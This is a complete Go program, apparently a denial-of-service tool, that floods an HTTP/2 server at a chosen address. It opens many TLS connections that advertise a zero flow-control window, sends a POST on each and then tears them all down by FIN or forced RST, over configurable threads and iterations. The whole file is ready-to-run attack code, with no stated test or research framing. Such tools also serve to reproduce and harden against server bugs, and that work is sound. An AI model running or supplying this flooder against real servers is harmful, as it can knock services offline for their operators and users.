package main

import (
	"bytes"
	"flag"
	"log"
	"crypto/tls"
	"sync/atomic"
	"time"
	"net"
	"os"
	"fmt"
	"syscall"
	"reflect"
	"unsafe"

	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

type TcpCloseType int

const (
	TcpCloseTypeUnknown TcpCloseType = iota
	TcpCloseTypeFin
	TcpCloseTypeRst
)

const (
	transportDefaultStreamFlow = 4 << 20
	maxFrameSize               = 1 << 24 - 1
	maxHeaderListSize          = 10 << 20
	headerTableSize            = 4096
)

var (
	iterations		int
	threads    		int
	address         	string
	host       		string
	close_type		string
	flood_type		string
	connections		int
	debug			int
)

var finished int64

func init() {
	flag.StringVar(&address, "address", ":443", "server address")
	flag.StringVar(&host, "host", "localhost", "host/authority header")
	flag.IntVar(&threads, "threads", 1, "number of threads to start")
	flag.IntVar(&iterations, "iterations", 1, "number of flood iterations")
	flag.IntVar(&connections, "connections", 100, "count of connections to flood")
	flag.StringVar(&close_type, "close_type", "unknown", "type of connection close (FIN/RST)")
	flag.StringVar(&flood_type, "flood_type", "unknown", "type of flood")
	flag.IntVar(&debug, "debug", 0, "debug level")
	flag.Parse()
}

func main() {
	log.Printf("Starting %d iterations in %d threads", iterations, threads)
	var iter_per_thread int = iterations / threads
	var rem int = iterations % threads

	for i := 0; i < threads; i++ {
		inc := 0
		if rem > 0 {
			inc = 1
			rem--
		}
		go func(i int, inc int) {
			for j := 0; j < iter_per_thread + inc; j++ {
				switch flood_type {
				case "http2_zero_window":
					flood_http2_zero_window(i, close_type)
				default:
					panic(fmt.Errorf("Unknown flood type: %s", flood_type))
				}
				nfinished := atomic.AddInt64(&finished, 1)
				if (nfinished == int64(iterations)) {
					log.Printf("All connections are finished, stopping program\n")
					os.Exit(0)
				}
			}
		}(i, inc)
	}

	done := make(chan struct{})
	<-done
}

func sendRst(conn net.Conn) error {
	// Extract syscall.RawConn from net.Conn
	tcpConn, ok := conn.(*net.TCPConn)
	if !ok {
		return fmt.Errorf("not a TCPConn")
	}

	rawConn, err := tcpConn.SyscallConn()
	if err != nil {
		return err
	}

	var serr error
	rawConn.Control(func(fd uintptr) {
		linger := syscall.Linger{
			Onoff:  1, // Enable linger
			Linger: 0, // Timeout = 0, causes RST on close
		}
		serr = syscall.SetsockoptLinger(int(fd), syscall.SOL_SOCKET, syscall.SO_LINGER, &linger)
		if serr != nil {
			return
		}
		serr = syscall.Close(int(fd)) // Close socket to send RST
	})
	return serr
}

func getNetConn(tlsConn *tls.Conn) net.Conn {
	v := reflect.ValueOf(tlsConn).Elem()
	connField := v.FieldByName("conn")
	conn := reflect.NewAt(connField.Type(), unsafe.Pointer(connField.UnsafeAddr())).Elem().Interface()
	return conn.(net.Conn)
}

func flood_http2_zero_window(cid int, close_type string) {
	conns := []*tls.Conn{}
	initialSettings := []http2.Setting{
		{ID: http2.SettingEnablePush, Val: 0},
		{ID: http2.SettingInitialWindowSize, Val: 0},
		{ID: http2.SettingMaxFrameSize, Val: maxFrameSize},
		{ID: http2.SettingMaxHeaderListSize, Val: maxHeaderListSize},
		{ID: http2.SettingHeaderTableSize, Val: headerTableSize},
	}
	conf := &tls.Config {
		InsecureSkipVerify: true,
		NextProtos: []string{"h2"},
    	}

    	for conn_n := 0; conn_n < connections; conn_n++ {
    		conn, err := tls.DialWithDialer(&net.Dialer{Timeout:  2 * time.Second},
					"tcp", address, conf)
		if err != nil {
			panic(err)
		}

		conns = append(conns, conn)
		_, err = conn.Write([]byte(http2.ClientPreface))
		if err != nil {
			panic(err)
		}

		framer := http2.NewFramer(conn, conn)
		err = framer.WriteSettings(initialSettings...)
		if err != nil {
			panic(err)
		}

		for i := 0; i < 2; i++ {
			_, err := readPrintFrame(cid, framer)
			if err != nil {
				panic(err)
			}
		}

		blockBuffer := bytes.Buffer{}
		henc := hpack.NewEncoder(&blockBuffer)
		henc.WriteField(hpack.HeaderField{Name: ":method", Value: "POST"})
		henc.WriteField(hpack.HeaderField{Name: ":path", Value: "/"})
		henc.WriteField(hpack.HeaderField{Name: ":scheme", Value: "https"})
		henc.WriteField(hpack.HeaderField{Name: ":authority", Value: "localhost"})

		err = framer.WriteHeaders(http2.HeadersFrameParam{
			StreamID:	1,
			EndStream:	true,
			EndHeaders:	true,
			BlockFragment:	blockBuffer.Bytes(),
		})
		if (err != nil) {
			panic(err)
		}

		for {
			frame, err := readPrintFrame(cid, framer)
			if err != nil {
				panic(err)
			}

			if hf, ok := frame.(*http2.HeadersFrame); ok {
				if hf.HeadersEnded() {
					break
				}
			}
		}
    	}

    	for conn_n := 0; conn_n < connections; conn_n++ {
    		var conn net.Conn = getNetConn(conns[conn_n])
    		var err error = nil
    		switch close_type {
    		case "FIN":
    			err = conn.Close()
    		case "RST":
    			err = sendRst(conn)
    		default:
    			panic("Invalid close type")
    		}

    		if err != nil {
        		panic(err)
    		}
    	}
}

func readPrintFrame(cid int, framer *http2.Framer) (http2.Frame, error) {
	frame, err := framer.ReadFrame()
	if err != nil {
		log.Printf("[%d] Error reading %+v. Reason: %s\n", cid, frame, err)
		return frame, err
	}

	if debug > 1 {
		log.Printf("[%d] Read frame %+v\n", cid, frame)
	}

	if frame.Header().Type == http2.FrameGoAway {
		log.Println(frame.(*http2.GoAwayFrame).ErrCode)
	}

	return frame, nil
}
